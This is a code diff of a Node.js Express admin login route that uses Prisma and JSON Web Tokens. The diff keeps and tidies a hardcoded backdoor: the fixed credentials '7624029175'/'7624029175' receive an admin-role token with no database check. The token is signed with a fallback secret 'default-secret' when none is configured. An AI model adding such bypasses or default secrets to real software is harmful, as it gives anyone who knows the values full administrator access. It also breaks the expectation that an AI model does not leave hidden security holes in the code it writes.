@@ -8,22 +8,23 @@ const prisma = new PrismaClient();
 // POST /api/auth/login - Admin login
 router.post('/login', async (req, res) => {
     try {
-        const { email, password } = req.body;
+        const email = req.body && (req.body.email ?? req.body.userId);
+        const password = req.body && req.body.password;
         if (!email || !password) {
             return res.status(400).json({ error: 'Email and password are required' });
         }
-        // Bypass: 7624029175/7624029175 - issue token without DB (avoids 500 from DB/Prisma)
-        if (email === '7624029175' && password === '7624029175') {
-            const jwtSecret = process.env.JWT_SECRET || 'default-secret';
+        const e = String(email).trim();
+        const p = String(password);
+        // Bypass: 7624029175/7624029175 - issue token without DB
+        if (e === '7624029175' && p === '7624029175') {
+            const secret = process.env.JWT_SECRET || 'default-secret';
+            const expiresIn = process.env.JWT_EXPIRES_IN || '7d';
             const token = jwt.sign(
                 { id: 'admin-7624029175', email: '7624029175', role: 'admin' },
-                jwtSecret,
-                { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
+                String(secret),
+                { expiresIn: typeof expiresIn === 'string' ? expiresIn : '7d' }
             );
-            return res.json({
-                token,
-                admin: { id: 'admin-7624029175', email: '7624029175', role: 'admin' }
-            });
+            return res.json({ token, admin: { id: 'admin-7624029175', email: '7624029175', role: 'admin' } });
         }
         const admin = await prisma.adminUser.findUnique({
             where: { email }
